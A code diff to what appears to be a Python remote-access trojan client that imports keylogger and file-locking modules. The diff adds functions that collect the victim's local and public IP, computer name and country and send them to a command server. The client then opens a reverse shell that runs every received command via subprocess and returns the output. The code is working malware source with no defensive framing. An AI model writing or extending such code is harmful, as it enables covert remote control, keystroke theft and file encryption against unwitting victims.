@@ -1,6 +1,7 @@
 import socket, os, subprocess, sys
 import  io
 import threading
+import  requests
 
 from KeyLogger import KeyLog
 from LockFile import LockFile
@@ -22,17 +23,36 @@ SERVER_PORT_SHELL = 5005
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "<sep>"
 
+def get_ip_address():
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    return ip_address
+
+def get_public_ip_address():
+    response = requests.get('https://api.ipify.org?format=json')
+    return response.json()['ip']
+
+def get_pc_name():
+    return socket.gethostname()
+
+def get_country():
+    response = requests.get('https://ipinfo.io')
+    data = response.json()
+    return data.get('country', 'Unknown')
 
 
 
 def client_shell():
     s = socket.socket()
-    print("before shell connect")
     s.connect((SERVER_HOST, SERVER_PORT_SHELL))
-    print("after shell connect")
     cwd = os.getcwd()
     s.send(cwd.encode())
-    print('after send!')
+    local_ip = get_ip_address()
+    pc_name = get_pc_name()
+    country = get_country()
+    infor = f"{local_ip}{SEPARATOR}{pc_name}{SEPARATOR}{country}"
+
+    s.send(infor.encode())
     while True:
         command = s.recv(BUFFER_SIZE).decode()
         print(f"comand: {command}")
@@ -65,11 +85,10 @@ def client_shell():
                 output = "Decrypt sucessfully!"
         else:
             output = subprocess.getoutput(command)
-        # print(f"output {output}")
-        cwd = os.getcwd()
-        message = f"{output}{SEPARATOR}{cwd}"
-        print(message)
-        s.send(message.encode())
+            cwd = os.getcwd()
+            message = f"{output}{SEPARATOR}{cwd}"
+            print(message)
+            s.send(message.encode())
 
 
 def client_keylogger():
@@ -95,14 +114,6 @@ t2.join()
 
 
 
-
-# def take_screenshot(socket):
-#     screenshot = pyautogui.screenshot()
-#     # Convert screenshot to bytes
-#     img_bytes = io.BytesIO()
-#     screenshot.save(img_bytes, format='PNG')
-#     img_data = img_bytes.getvalue()
-#     socket.sendall(f"{len(img_data).to_bytes(4, byteorder='big')}{SEPARATOR}{'image'}")
 
 
 
